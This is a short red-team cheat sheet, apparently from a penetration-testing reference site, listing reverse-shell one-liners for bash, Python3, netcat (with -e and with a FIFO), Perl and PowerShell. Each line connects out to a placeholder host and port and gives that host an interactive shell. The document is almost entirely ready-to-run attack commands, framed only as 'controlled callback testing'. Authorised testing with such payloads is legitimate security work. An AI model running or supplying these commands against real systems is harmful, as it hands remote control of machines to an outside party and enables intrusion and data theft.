# Reverse Shells

Compact reverse-shell one-liners for controlled callback testing.

<div class="ol-section-kicker"><span>RT</span><strong>Callback</strong></div>

## Bash /dev/tcp

```bash
bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1
```

**Tool:** bash · **Platform:** Linux · **Tags:** Reverse Shell, TCP

## Python3 PTY reverse shell

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<HOST>",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

**Tool:** Python · **Platform:** Linux/macOS · **Tags:** Reverse Shell, PTY, TCP

## Netcat with -e

```bash
nc <HOST> <PORT> -e /bin/sh
```

**Tool:** netcat · **Platform:** Linux · **Tags:** Reverse Shell, TCP

**Note:** requires a netcat build that supports `-e`.

## Netcat FIFO shell

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <HOST> <PORT> >/tmp/f
```

**Tool:** mkfifo + netcat · **Platform:** Linux · **Tags:** Reverse Shell, FIFO, TCP

## Perl reverse shell

```bash
perl -e 'use Socket;$i="<HOST>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Tool:** Perl · **Platform:** Linux/macOS · **Tags:** Reverse Shell, TCP

## PowerShell TCP reverse shell

```powershell
$c=New-Object System.Net.Sockets.TCPClient("<HOST>",<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$o=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($o,0,$o.Length);$s.Flush()}
```

**Tool:** PowerShell · **Platform:** Windows · **Tags:** Reverse Shell, TCP, PowerShell
